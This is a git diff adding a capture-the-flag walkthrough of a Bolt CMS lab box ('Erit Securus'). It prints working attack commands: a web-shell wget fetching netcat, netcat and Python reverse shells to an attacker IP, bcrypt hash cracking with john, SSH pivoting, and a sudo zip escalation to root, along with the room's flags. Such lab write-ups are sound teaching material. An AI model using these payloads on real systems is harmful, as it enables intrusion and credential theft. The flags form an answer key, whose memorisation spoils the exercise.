@@ -318,3 +318,323 @@ Using the PHP shell we are able to download netcat to the target via the browser
 http://erit.thm/files/cmd.php?cmd=wget%20http://10.11.81.220/nc
 ```
 ```text
+┌──(kali㉿kali)-[~/bolt/Boltcms-Auth-rce-py]
+└─$ python3 -m http.server 80  
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.138.76 - - [09/Oct/2022 14:42:33] "GET /nc HTTP/1.1" 200 -
+
+This file is dropped in the same directory as our c.php. We make this nc executable like this:
+
+http://erit.thm/files/cmd.php?cmd=chmod%20755%20nc
+
+%20 is space
+
+Next we need to start a netcat listener on our local machine
+```
+```text
+┌──(kali㉿kali)-[~/bolt/Boltcms-Auth-rce-py]
+└─$ rlwrap nc -nlvp 4444                                 
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+
+Finally, we can trigger this connection via the browser to get our reverse shell:
+
+http://erit.thm/files/cmd.php?cmd=./nc%20-e%20/bin/bash%2010.11.81.220%204444
+```
+```text
+┌──(kali㉿kali)-[~/bolt/Boltcms-Auth-rce-py]
+└─$ rlwrap nc -nlvp 4444
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+
+not work so using python rev shell
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.81.220",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+
+Enter OS command , for exit 'quit' : python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.81.220",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+```
+```text
+┌──(kali㉿kali)-[~/bolt/Boltcms-Auth-rce-py]
+└─$ rlwrap nc -nlvp 4444
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.138.76.
+Ncat: Connection from 10.10.138.76:54668.
+www-data@Erit:/var/www/html/public/files$ whoami
+whoami
+www-data
+
+it works!
+```
+### Priv esc
+In the app/database directory you will find the bolt.db SQLite3 database
+file bolt.db
+bolt.db: SQLite 3.x database, last written using SQLite version 3020001
+Open database:
+![](https://i.imgur.com/Fajrmfg.png)
+This contains a lot of tables:
+![](https://i.imgur.com/fcS9AJM.png)
+We list the bolt user database, like this:
+![](https://i.imgur.com/WV9wdwV.png)
+We see two users, the admin we already own, the other one is a wild one. We also see another IP address, 192.168.100.1 (note to self)
+We copy the hash and save it to a file. Then run it through john the ripper, using the infamous "rockyou wordlist
+john hash -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+Using this password, we try to su as the user wileec. This works, and we should find our first flag
+```text
+www-data@Erit:/var/www/html/public/files$ cd ../../app/database
+cd ../../app/database
+www-data@Erit:/var/www/html/app/database$ ls
+ls
+bolt.db
+www-data@Erit:/var/www/html/app/database$ sqlite3 bolt.db
+sqlite3 bolt.db
+.tables
+bolt_authtoken          bolt_field_value        bolt_pages            
+bolt_blocks             bolt_homepage           bolt_relations        
+bolt_content_changelog  bolt_log                bolt_showcases        
+bolt_cron               bolt_log_change         bolt_taxonomy         
+bolt_entries            bolt_log_system         bolt_users            
+select * from bolt_users
+;
+1|admin|$2y$10$id08BrqKsH9TtviCH4Q9q.W6nF38j2RpODkGajLmg77cMCWBNFMYG||0|a@a.com|2022-10-09 18:29:06|192.168.100.1|[]|1|||||["root","everyone"]
+2|wildone|$2y$10$ZZqbTKKlgDnCMvGD2M0SxeTS3GPSCljXWtd172lI2zj3p6bjOCGq.|Wile E Coyote|0|wild@one.com|2020-04-25 16:03:44|192.168.100.1|[]|1|||||["editor"]
+```
+```text
+┌──(kali㉿kali)-[~/bolt/Boltcms-Auth-rce-py]
+└─$ echo '$2y$10$ZZqbTKKlgDnCMvGD2M0SxeTS3GPSCljXWtd172lI2zj3p6bjOCGq.' > hash
+```
+```text
+┌──(kali㉿kali)-[~/bolt/Boltcms-Auth-rce-py]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash    
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+snickers         (?)     
+1g 0:00:00:06 DONE (2022-10-09 15:01) 0.1547g/s 78.01p/s 78.01c/s 78.01C/s pasaway..claire
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+doing again but with pty
+```
+```text
+┌──(kali㉿kali)-[~/bolt/Boltcms-Auth-rce-py]
+└─$ rlwrap nc -nlvp 4444
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.138.76.
+Ncat: Connection from 10.10.138.76:54715.
+www-data@Erit:/var/www/html/public/files$ python -c 'import pty;pty.spawn("/bin/bash")'
+bash")'-c 'import pty;pty.spawn("/bin/b
+www-data@Erit:/var/www/html/public/files$ ls
+ls
+cmd.php                       placeholder_ecff05026ae6.jpg  test25.php
+index.html                    test1.php                     test26.php
+nc                            test10.php                    test27.php
+placeholder_07f6539b3d7d.jpg  test11.php                    test28.php
+placeholder_0a23551a8097.jpg  test12.php                    test29.php
+placeholder_0aa7e8852e11.jpg  test13.php                    test3.php
+placeholder_1fad82e5eac1.jpg  test14.php                    test30.php
+placeholder_20001088e915.jpg  test15.php                    test31.php
+placeholder_46f89a97453b.jpg  test16.php                    test32.php
+placeholder_6a843969b527.jpg  test17.php                    test33.php
+placeholder_7c21b25839bd.jpg  test18.php                    test4.php
+placeholder_84f5c9d2e2c2.jpg  test19.php                    test5.php
+placeholder_8a7754ace050.jpg  test2.php                     test6.php
+placeholder_8ec2add549d6.jpg  test20.php                    test7.php
+placeholder_9cf46a03a9c3.jpg  test21.php                    test8.php
+placeholder_aa536d42187b.jpg  test22.php                    test9.php
+placeholder_addfa01cba49.jpg  test23.php
+placeholder_c45564b83b31.jpg  test24.php
+www-data@Erit:/var/www/html/public/files$ cd /home
+cd /home
+www-data@Erit:/home$ ls
+ls
+wileec
+www-data@Erit:/home$ su wileec
+su wileec
+Password: snickers
+```
+```text
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+python -c 'import pty;pty.spawn("/bin/bash")'
+wileec@Erit:/home$ ls                 ls
+ls
+wileec
+wileec@Erit:/home$ cd wileec          cd wileec
+cd wileec
+wileec@Erit:~$ ls             ls
+ls
+flag1.txt
+wileec@Erit:~$ cat flag1.txt  cat flag1.txt
+cat flag1.txt
+THM{Hey!_Welcome_in}
+
+or upgrading another way
+```
+```text
+$ SHELL=/bin/bash script -q /dev/null
+```
+What is the users password?
+*snickers*
+Flag 1
+### Pivoting
+User wileec has a ssh private-key!
+wileec@Erit:~$ ls -lart .ssh/
+-rw-r--r-- 1 wileec wileec  393 Apr 25 15:19 id_rsa.pub
+-rw------- 1 wileec wileec 1675 Apr 25 15:19 id_rsa
+-rw-r--r-- 1 wileec wileec  222 Apr 25 15:32 known_hosts
+Remember the other IP address? We could try to connect to that one, using the SSH key:
+ssh wileec@192.168.100.1
+Remember: This has to be done from inside of the box, as this network is not available to you from the outside.
+We can sudo!
+If you look at gtfobins we can see how we could leverage this.
+The command is not going to work as it is, you must edit some parts.
+```text
+wileec@Erit:~$ ls -la .ssh    ls -la .ssh
+ls -la .ssh
+total 20
+drwxr-xr-x 2 wileec wileec 4096 Apr 25  2020 .
+drwxr-xr-x 4 wileec wileec 4096 Apr 25  2020 ..
+-rw------- 1 wileec wileec 1675 Apr 25  2020 id_rsa
+-rw-r--r-- 1 wileec wileec  393 Apr 25  2020 id_rsa.pub
+-rw-r--r-- 1 wileec wileec  222 Apr 25  2020 known_hosts
+
+Remember the other IP address? We could try to connect to that one, using the SSH key: 
+
+wileec@Erit:~$ ssh wileec@192.ssh wileec@192.168.100.1
+ssh wileec@192.168.100.1
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Apr 25 12:36:02 2020 from 192.168.100.100
+```
+
+## Privilege Escalation
+```text
+$ SHELL=/bin/bash script -q /dev/null
+SHELL=/bin/bash script -q /dev/null
+wileec@Securus:~$ sudo -l           sudo -l
+sudo -l
+Matching Defaults entries for wileec on Securus:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User wileec may run the following commands on Securus:
+    (jsmith) NOPASSWD: /usr/bin/zip
+```
+User wileec can sudo! What can he sudo? sudo -l
+*(jsmith) NOPASSWD: /usr/bin/zip*
+Using the sudo-trick, we’re now mr or mrs Smith (and admit, who does not want to be a Mr. or Mrs. Smith once in their life?), as an extra reward, there is flag 2 here.
+```text
+wileec@Securus:~$ TF=$(mktemp -u)   TF=$(mktemp -u)
+TF=$(mktemp -u)
+wileec@Securus:~$ sudo -u jsmith zipsudo -u jsmith zip $TF /etc/hosts -T -TT 'sh #'
+sudo -u jsmith zip $TF /etc/hosts -T -TT 'sh #'
+  adding: etc/hosts (deflated 32%)
+```
+```text
+$ sudo rm $TF
+sudo rm $TF
+rm: missing operand
+Try 'rm --help' for more information.
+```
+```text
+$ SHELL=/bin/bash script -q /dev/null
+SHELL=/bin/bash script -q /dev/null
+
+jsmith@Securus:/home/wileec$ cd ..                        cd ..
+cd ..
+jsmith@Securus:/home$ ls                    ls
+ls
+jsmith  wileec
+jsmith@Securus:/home$ cd jsmith             cd jsmith
+cd jsmith
+jsmith@Securus:~$ ls -la            ls -la
+ls -la
+total 24
+drwxrwx--- 2 jsmith jsmith 4096 Apr 25  2020 .
+drwxr-xr-x 4 root   root   4096 Apr 26  2020 ..
+-rw-r--r-- 1 jsmith jsmith  220 Nov  5  2016 .bash_logout
+-rw-r--r-- 1 jsmith jsmith 3515 Nov  5  2016 .bashrc
+-rw-r--r-- 1 jsmith jsmith   33 Apr 25  2020 flag2.txt
+-rw-r--r-- 1 jsmith jsmith  675 Nov  5  2016 .profile
+jsmith@Securus:~$ cat flag2.txt     cat flag2.txt
+cat flag2.txt
+THM{Welcome_Home_Wile_E_Coyote!}
+
+from gtfobins
+```
+```text
+$ TF=$(mktemp -u)
+```
+```text
+$ sudo -u jsmith zip $TF /etc/hosts -T -TT 'sh #'
+```
+```text
+$ sudo rm $TF
+```
+```text
+$ SHELL=/bin/bash script -q /dev/null
+```
+Flag 2
+As jsmith, we again check for sudo rights (this btw, should be your first action on any box when gaining access to a account)
+There are several ways to exploit this rights. Go for it!
+```text
+jsmith@Securus:~$ sudo -l           sudo -l
+sudo -l
+Matching Defaults entries for jsmith on Securus:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User jsmith may run the following commands on Securus:
+    (ALL : ALL) NOPASSWD: ALL
+jsmith@Securus:~$ sudo su           sudo su
+sudo su
+root@Securus:/home/jsmith# ls -la
+ls -la
+total 24
+drwxrwx--- 2 jsmith jsmith 4096 Apr 25  2020 .
+drwxr-xr-x 4 root   root   4096 Apr 26  2020 ..
+-rw-r--r-- 1 jsmith jsmith  220 Nov  5  2016 .bash_logout
+-rw-r--r-- 1 jsmith jsmith 3515 Nov  5  2016 .bashrc
+-rw-r--r-- 1 jsmith jsmith   33 Apr 25  2020 flag2.txt
+-rw-r--r-- 1 jsmith jsmith  675 Nov  5  2016 .profile
+root@Securus:/home/jsmith# cd /root
+cd /root
+root@Securus:~# ls -la
+ls -la
+total 28
+drwx------  4 root root 4096 Apr 26  2020 .
+drwxr-xr-x 22 root root 4096 Apr 17  2020 ..
+lrwxrwxrwx  1 root root    9 Apr 22  2020 .bash_history -> /dev/null
+-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
+-rw-r--r--  1 root root   43 Apr 25  2020 flag3.txt
+drwx------  2 root root 4096 Apr 23  2020 .gnupg
+-rw-r--r--  1 root root  140 Nov 19  2007 .profile
+drwx------  2 root root 4096 Apr 17  2020 .ssh
+root@Securus:~# cat flag3.txt
+cat flag3.txt
+THM{Great_work!_You_pwned_Erit_Securus_1!}
+```
+What sudo rights does jsmith have?
+*(ALL : ALL) NOPASSWD: ALL*
+Flag 3
+
+## Flags / Answers
+- ***THM{Hey!_Welcome_in}***
+- ***THM{Welcome_Home_Wile_E_Coyote!}***
+- ***THM{Great_work!_You_pwned_Erit_Securus_1!}***
+
+## Notes / Lessons Learned
+[[PowerShell for Pentesters]]
+
